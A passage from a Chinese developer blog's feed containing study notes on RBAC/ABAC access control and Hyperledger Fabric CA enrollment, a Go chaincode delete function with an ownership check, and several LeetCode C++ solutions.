    <content type="html"><![CDATA[<h2 id="什么是abac-rbac"><a class="markdownIt-Anchor" href="#什么是abac-rbac"></a> 什么是ABAC、RBAC</h2><h3 id="rbac-role-based-access-control"><a class="markdownIt-Anchor" href="#rbac-role-based-access-control"></a> RBAC – role based access control</h3><p>基于角色的访问控制，系统根据用户的角色判断用户是否具有权限</p><ul><li>分类<ul><li>Flat RBAC：每个员工至少被分配一个角色，但有些人可以拥有多个角色。如果有人想要访问新文件/资源​​/服务器，他们需要先获得一个新角色。</li><li>分层 RBAC：角色是根据资历级别定义的。除了自己的特权外，高级员工还拥有下属的特权。</li><li>受约束的 RBAC：该模型引入了职责分离 (SOD)。SOD 将执行任务的权限分散到多个用户，从而降低欺诈和/或风险活动的风险。例如，如果开发人员想要停用服务器，他们不仅需要直接经理的批准，还需要基础设施负责人的批准。这让基础设施负责人做出改变，拒绝有风险和/或不必要的请求。</li><li>对称 RBAC：定期审查所有组织角色。作为这些审查的结果，可能会分配或撤销特权，可能会添加或删除角色。</li></ul></li></ul><h3 id="abac-attribute-based-access-control"><a class="markdownIt-Anchor" href="#abac-attribute-based-access-control"></a> ABAC – attribute based access control</h3><p>基于属性的访问控制，系统根据用户的属性判断权限，属性可能与用户、访问的资源、行为和环境等因素相关</p><h2 id="优缺点"><a class="markdownIt-Anchor" href="#优缺点"></a> 优缺点</h2><h3 id="rbac"><a class="markdownIt-Anchor" href="#rbac"></a> RBAC</h3><ul><li>优点<ul><li>简易：定义角色比分配角色更容易</li><li>层级：更容易定义层次结构，上级拥有下级的权限</li><li>成本：角色较少时，实施成本低</li></ul></li><li>缺点<ul><li>角色爆炸：容易角色爆炸，导致要添加更多角色满足需求。在角色爆炸的情况下，将用户需求转换为角色可能是一项复杂的任务</li></ul></li></ul><h3 id="abac"><a class="markdownIt-Anchor" href="#abac"></a> ABAC</h3><ul><li>优点<ul><li>细粒度：可以定义更加精细的控制策略，从大量的属性中进行选择</li><li>可扩展性：无需修改现有规则以适应新用户。管理员需要做的就是为新加入者分配相关属性。</li><li>易于维护：通过修改属性而不是定义新角色修改用户权限</li></ul></li><li>缺点<ul><li>资源：比RBAC更耗时，更多资源，经济成本更高</li></ul></li></ul><h2 id="适用范围"><a class="markdownIt-Anchor" href="#适用范围"></a> 适用范围</h2><h3 id="abac-2"><a class="markdownIt-Anchor" href="#abac-2"></a> ABAC</h3><ul><li>大型组织，支持可扩展性</li><li>需要根据环境，如地理位置，时间等因素判断权限</li><li>想要尽可能精细和灵活的访问控制策略</li><li>有时间、资源和预算来正确实施 ABAC</li></ul><h3 id="rbac-2"><a class="markdownIt-Anchor" href="#rbac-2"></a> RBAC</h3><ul><li>在中小型组织中</li><li>在您的组织内拥有定义明确的群体，并且应用广泛的、基于角色的策略是有意义的</li><li>实施访问控制策略的时间、资源和/或预算有限</li><li>不要有太多的外部贡献者，也不需要加入很多新人</li></ul><h2 id="fabric中对abac的支持"><a class="markdownIt-Anchor" href="#fabric中对abac的支持"></a> fabric中对abac的支持</h2><ul><li><a href="https://hyperledger-fabric-ca.readthedocs.io/en/latest/users-guide.html#attribute-based-access-control">地址</a></li><li><a href="https://github.com/hyperledger/fabric-chaincode-go/blob/main/pkg/cid/README.md">abac api</a></li></ul><h2 id="fabric数据增删改查"><a class="markdownIt-Anchor" href="#fabric数据增删改查"></a> fabric数据增删改查</h2><h3 id="删除"><a class="markdownIt-Anchor" href="#删除"></a> 删除</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *SmartContract)</span></span> DeleteAsset(ctx contractapi.TransactionContextInterface, id <span class="type">string</span>) <span class="type">error</span> &#123;</span><br><span class="line"></span><br><span class="line">asset, err := s.ReadAsset(ctx, id)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">clientID, err := s.GetSubmittingClientIdentity(ctx)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> clientID != asset.Owner &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;submitting client not authorized to update asset, does not own asset&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ctx.GetStub().DelState(id)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;什么是abac-rbac&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#什么是abac-rbac&quot;&gt;&lt;/a&gt; 什么是ABAC、RBAC&lt;/h2&gt;
&lt;h3 id=&quot;rbac-role-based-access-control&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#rbac-role-based-access-control&quot;&gt;&lt;/a&gt; RBAC – role based access control&lt;/h3&gt;
&lt;p&gt;基于角色的访问控制，系统根据用户的角色判断用户是否具有权限&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;分类
&lt;ul&gt;
&lt;li&gt;Flat RBAC：每个员工至少被分配一个角色，但有些人可以拥有多个角色。如果有人想要访问新文件/资源​​/服务器，他们需要先获得一个新角色。&lt;/li&gt;
&lt;li&gt;分层 RBAC：角色是根据资历级别定义的。除了自己的特权外，高级员工还拥有下属的特权。&lt;/li&gt;
&lt;li&gt;受约束的 RBAC：该模型引入了职责分离 (SOD)。SOD 将执行任务的权限分散到多个用户，从而降低欺诈和/或风险活动的风险。例如，如果开发人员想要停用服务器，他们不仅需要直接经理的批准，还需要基础设施负责人的批准。这让基础设施负责人做出改变，拒绝有风险和/或不必要的请求。&lt;/li&gt;
&lt;li&gt;对称 RBAC：定期审查所有组织角色。作为这些审查的结果，可能会分配或撤销特权，可能会添加或删除角色。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;abac-attribute-based-access-control&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#abac-attribute-based-access-control&quot;&gt;&lt;/a&gt; ABAC – attribute based access control&lt;/h3&gt;
&lt;p&gt;基于属性的访问控制，系统根据用户的属性判断权限，属性可能与用户、访问的资源、行为和环境等因素相关&lt;/p&gt;</summary>
    
    
    
    <category term="组会" scheme="https://jingtianer.github.io/home/categories/%E7%BB%84%E4%BC%9A/"/>
    
    
    <category term="abac" scheme="https://jingtianer.github.io/home/tags/abac/"/>
    
    <category term="组会" scheme="https://jingtianer.github.io/home/tags/%E7%BB%84%E4%BC%9A/"/>
    
  </entry>
  
  <entry>
    <title>fabric 准入调研</title>
    <link href="https://jingtianer.github.io/home/2022/11/22/%E7%BB%84%E4%BC%9A/Fabric%E5%87%86%E5%85%A5/"/>
    <id>https://jingtianer.github.io/home/2022/11/22/%E7%BB%84%E4%BC%9A/Fabric%E5%87%86%E5%85%A5/</id>
    <published>2022-11-22T04:15:37.000Z</published>
    <updated>2022-11-28T01:00:34.291Z</updated>
    
    <content type="html"><![CDATA[<h2 id="fabric-ca"><a href="#fabric-ca" class="headerlink" title="fabric ca"></a>fabric ca</h2><ul><li><p><a href="https://hyperledger-fabric-ca.readthedocs.io/en/latest/deployguide/cadeploy.html">官方教程</a></p></li><li><p>fabric ca提供以下几个功能</p><ul><li>注册, registration of identities, or connects to LDAP as the user registry</li><li>签发注册证书, issuance of Enrollment Certificates (ECerts)</li><li>证书续订和吊销, certificate renewal and revocation</li></ul></li></ul><p><img src="https://hyperledger-fabric-ca.readthedocs.io/en/latest/_images/fabric-ca.png"></p><h3 id="负载平衡"><a href="#负载平衡" class="headerlink" title="负载平衡"></a>负载平衡</h3><p>Hyperledger Fabric CA 客户端或 SDK 可以连接到 Hyperledger Fabric CA 服务器集群中的服务器。这在图表的右上角进行了说明。客户端路由到 HA 代理端点，该端点将流量负载平衡到其中一个结构服务器集群成员。</p><h2 id="user注册"><a href="#user注册" class="headerlink" title="user注册"></a>user注册</h2><h3 id="使用fabric-gateway"><a href="#使用fabric-gateway" class="headerlink" title="使用fabric gateway"></a>使用fabric gateway</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">读取公钥私钥文件</span><br><span class="line">创建Identity</span><br><span class="line">与ca/peer建立grpc连接，获取fabric网络和contract</span><br></pre></td></tr></table></figure><h3 id="不使用fabric-gateway"><a href="#不使用fabric-gateway" class="headerlink" title="不使用fabric gateway"></a>不使用fabric gateway</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">读取connection-*.json的位置，（提前生成的ccp对象）</span><br><span class="line">获取ca，检查用户名是否已经注册</span><br><span class="line">获取adminIdentity</span><br><span class="line">注册，enroll</span><br></pre></td></tr></table></figure><ul><li>用户只需要提供自己的ID<code>appUser</code>，就可以生成访问区块链的身份</li><li>如果使用fabric gateway，需要peer的msp公钥私钥和证书</li><li>如果不使用fabric gateway，则需要用户端知道ca的访问账户和密码<code>admin:adminpw</code></li><li>通过ca可以获得对contract的使用权，但是如果有其它业务，如果不用合约实现，可能需要传统的注册方式，并于ca的身份绑定</li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;fabric-ca&quot;&gt;&lt;a href=&quot;#fabric-ca&quot; class=&quot;headerlink&quot; title=&quot;fabric ca&quot;&gt;&lt;/a&gt;fabric ca&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://hyperledger-fabric-ca.readthedocs.io/en/latest/deployguide/cadeploy.html&quot;&gt;官方教程&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;fabric ca提供以下几个功能&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;注册, registration of identities, or connects to LDAP as the user registry&lt;/li&gt;
&lt;li&gt;签发注册证书, issuance of Enrollment Certificates (ECerts)&lt;/li&gt;
&lt;li&gt;证书续订和吊销, certificate renewal and revocation&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&quot;https://hyperledger-fabric-ca.readthedocs.io/en/latest/_images/fabric-ca.png&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;负载平衡&quot;&gt;&lt;a href=&quot;#负载平衡&quot; class=&quot;headerlink&quot; title=&quot;负载平衡&quot;&gt;&lt;/a&gt;负载平衡&lt;/h3&gt;&lt;p&gt;Hyperledger Fabric CA 客户端或 SDK 可以连接到 Hyperledger Fabric CA 服务器集群中的服务器。这在图表的右上角进行了说明。客户端路由到 HA 代理端点，该端点将流量负载平衡到其中一个结构服务器集群成员。&lt;/p&gt;
&lt;h2 id=&quot;user注册&quot;&gt;&lt;a href=&quot;#user注册&quot; class=&quot;headerlink&quot; title=&quot;user注册&quot;&gt;&lt;/a&gt;user注册&lt;/h2&gt;</summary>
    
    
    
    <category term="组会" scheme="https://jingtianer.github.io/home/categories/%E7%BB%84%E4%BC%9A/"/>
    
    
    <category term="组会" scheme="https://jingtianer.github.io/home/tags/%E7%BB%84%E4%BC%9A/"/>
    
    <category term="fabric" scheme="https://jingtianer.github.io/home/tags/fabric/"/>
    
  </entry>
  
  <entry>
    <title>MIT-6.824-notebook</title>
    <link href="https://jingtianer.github.io/home/2022/11/19/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/6.824/mit6.824notes/"/>
    <id>https://jingtianer.github.io/home/2022/11/19/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/6.824/mit6.824notes/</id>
    <published>2022-11-19T10:00:36.000Z</published>
    <updated>2022-11-21T07:11:39.702Z</updated>
    
    <content type="html"><![CDATA[<h2 id="地址"><a href="#地址" class="headerlink" title="地址"></a><a href="/home/pdf/Mit6.824Notebook.pdf">地址</a></h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;地址&quot;&gt;&lt;a href=&quot;#地址&quot; class=&quot;headerlink&quot; title=&quot;地址&quot;&gt;&lt;/a&gt;&lt;a href=&quot;/home/pdf/Mit6.824Notebook.pdf&quot;&gt;地址&lt;/a&gt;&lt;/h2&gt;</summary>
      
    
    
    
    <category term="OS" scheme="https://jingtianer.github.io/home/categories/OS/"/>
    
    
    <category term="6.824" scheme="https://jingtianer.github.io/home/tags/6-824/"/>
    
  </entry>
  
  <entry>
    <title>LeetCode-19</title>
    <link href="https://jingtianer.github.io/home/2022/11/15/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%9319/"/>
    <id>https://jingtianer.github.io/home/2022/11/15/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%9319/</id>
    <published>2022-11-15T03:14:34.000Z</published>
    <updated>2022-11-17T04:59:46.973Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1710-卡车上的最大单元数"><a href="#1710-卡车上的最大单元数" class="headerlink" title="1710. 卡车上的最大单元数"></a><a href="https://leetcode.cn/problems/maximum-units-on-a-truck/">1710. 卡车上的最大单元数</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maximumUnits</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; boxTypes, <span class="type">int</span> truckSize)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">sort</span>(boxTypes.<span class="built_in">begin</span>(), boxTypes.<span class="built_in">end</span>(), [](vector&lt;<span class="type">int</span>&gt;&amp; x, vector&lt;<span class="type">int</span>&gt;&amp; y)-&gt;<span class="type">bool</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> x[<span class="number">1</span>] &gt; y[<span class="number">1</span>];</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="type">int</span> n = boxTypes.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(truckSize) &#123;</span><br><span class="line">                ret += <span class="built_in">min</span>(truckSize, boxTypes[i][<span class="number">0</span>])*boxTypes[i][<span class="number">1</span>];</span><br><span class="line">                truckSize -= <span class="built_in">min</span>(truckSize, boxTypes[i][<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 50 + 27 + 14 = 91</span></span><br></pre></td></tr></table></figure><blockquote><p>简单题，排个序就行</p></blockquote><h2 id="775-全局倒置与局部倒置"><a href="#775-全局倒置与局部倒置" class="headerlink" title="775. 全局倒置与局部倒置"></a><a href="https://leetcode.cn/problems/global-and-local-inversions/">775. 全局倒置与局部倒置</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isIdealPermutation</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">abs</span>(nums[i] - i) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>最开始想复杂了，想用差分数组统计个数</p></blockquote><h2 id="39-组合总和"><a href="#39-组合总和" class="headerlink" title="39. 组合总和"></a><a href="https://leetcode.cn/problems/combination-sum/">39. 组合总和</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="type">int</span> target;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; res;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">combinationSum</span>(vector&lt;<span class="type">int</span>&gt;&amp; candidates, <span class="type">int</span> target) &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;target = target;</span><br><span class="line">        n = candidates.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; vec;</span><br><span class="line">        <span class="built_in">search</span>(<span class="number">0</span>, <span class="number">0</span>, vec, <span class="built_in">move</span>(candidates));</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">search</span><span class="params">(<span class="type">int</span> index, <span class="type">int</span> sum, vector&lt;<span class="type">int</span>&gt; &amp; vec, vector&lt;<span class="type">int</span>&gt;&amp;&amp; candidates)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(sum == target) &#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(vec);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(sum &gt; target) <span class="keyword">return</span>;</span><br><span class="line">        vec.<span class="built_in">push_back</span>(candidates[index]);</span><br><span class="line">        <span class="built_in">search</span>(index, sum+candidates[index], vec, <span class="built_in">move</span>(candidates));</span><br><span class="line">        vec.<span class="built_in">pop_back</span>();</span><br><span class="line">        <span class="keyword">if</span>(index+<span class="number">1</span> &lt; n) &#123;</span><br><span class="line">            <span class="built_in">search</span>(index+<span class="number">1</span>, sum, vec, <span class="built_in">move</span>(candidates));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>硬搜，不要重复就好了</p></blockquote><h2 id="792-匹配子序列的单词数"><a href="#792-匹配子序列的单词数" class="headerlink" title="792. 匹配子序列的单词数"></a><a href="https://leetcode.cn/problems/number-of-matching-subsequences/">792. 匹配子序列的单词数</a></h2><h3 id="超时1"><a href="#超时1" class="headerlink" title="超时1"></a>超时1</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">numMatchingSubseq</span><span class="params">(string s, vector&lt;string&gt;&amp; words)</span> </span>&#123;</span><br><span class="line">        n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> len = words.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">isSubstr</span>(<span class="built_in">move</span>(s), <span class="built_in">move</span>(words[i]))) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isSubstr</span><span class="params">(string&amp;&amp; s, string&amp;&amp; word)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> nw = word.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(n, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(nw, <span class="number">0</span>));</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>]=(word[<span class="number">0</span>]==s[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;n;i++) &#123;</span><br><span class="line">            dp[i][<span class="number">0</span>] = <span class="built_in">max</span>(dp[i<span class="number">-1</span>][<span class="number">0</span>], <span class="built_in">int</span>(word[<span class="number">0</span>]==s[i]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;nw;i++)&#123;</span><br><span class="line">            dp[<span class="number">0</span>][i] = <span class="built_in">max</span>(dp[<span class="number">0</span>][i<span class="number">-1</span>], <span class="built_in">int</span>(s[<span class="number">0</span>]==word[i]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; nw; j++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">                dp[i][j] = <span class="built_in">max</span>(dp[i<span class="number">-1</span>][j<span class="number">-1</span>] + <span class="built_in">int</span>(s[i] == word[j]),<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j],dp[i][j<span class="number">-1</span>]));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//cout &lt;&lt; dp[n-1][nw-1] &lt;&lt; endl;</span></span><br><span class="line">        <span class="keyword">return</span> dp[n<span class="number">-1</span>][nw<span class="number">-1</span>]==nw;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="超时2"><a href="#超时2" class="headerlink" title="超时2"></a>超时2</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">numMatchingSubseq</span><span class="params">(string s, vector&lt;string&gt;&amp; words)</span> </span>&#123;</span><br><span class="line">        n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> len = words.<span class="built_in">size</span>();</span><br><span class="line">        unordered_map&lt;string, <span class="type">bool</span>&gt; m;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(m.<span class="built_in">count</span>(words[i])) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isSubstr</span>(<span class="built_in">move</span>(s), <span class="built_in">move</span>(words[i]))) &#123;</span><br><span class="line">                m[words[i]] = <span class="literal">true</span>;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isSubstr</span><span class="params">(string&amp;&amp; s, string&amp;&amp; word)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> nw = word.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; nw; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(;j&lt;n &amp;&amp; word[i] != s[j]; j++);</span><br><span class="line">            <span class="keyword">if</span>(j == n) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;1710-卡车上的最大单元数&quot;&gt;&lt;a href=&quot;#1710-卡车上的最大单元数&quot; class=&quot;headerlink&quot; title=&quot;1710. 卡车上的最大单元数&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://leetcode.cn/problems/maximum-units-on-a-truck/&quot;&gt;1710. 卡车上的最大单元数&lt;/a&gt;&lt;/h2&gt;&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td 